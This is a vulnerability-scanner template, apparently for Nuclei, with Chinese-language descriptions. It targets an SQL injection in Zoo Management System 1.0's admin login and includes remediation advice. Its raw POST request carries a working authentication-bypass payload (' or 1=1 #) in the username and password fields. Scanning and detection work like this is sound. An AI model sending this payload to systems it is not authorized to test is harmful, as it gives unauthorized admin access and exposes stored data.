id: zms-auth-bypass

info:
  name: Zoo Management System 1.0 - SQL 注入漏洞
  author: dwisiswant0
  severity: critical
  description: |
    该模板用于检测 Zoo Management System 1.0 - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会向 `/zms/admin/index.php` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://www.exploit-db.com/exploits/48880
    - https://packetstormsecurity.com/files/159567/Zoo-Management-System-1.0-SQL-Injection.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
  metadata:
    max-request: 1
  tags: edb,auth-bypass,packetstorm,zms,sqli,vuln

http:
  - raw:
      - |
        POST /zms/admin/index.php HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Content-Type: application/x-www-form-urlencoded
        Origin: {{BaseURL}}
        Referer: {{BaseURL}}/zms/admin/index.php
        Cookie: PHPSESSID={{randstr}}

        username=dw1%27+or+1%3D1+%23&password=dw1%27+or+1%3D1+%23&login=

    host-redirects: true
    max-redirects: 1

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "Zoo Management System (\\|\\| Dashboard|@ 2020\\. All right reserved)"
          - "ZMS ADMIN"
        condition: and
        part: body

      - type: status
        status:
          - 200
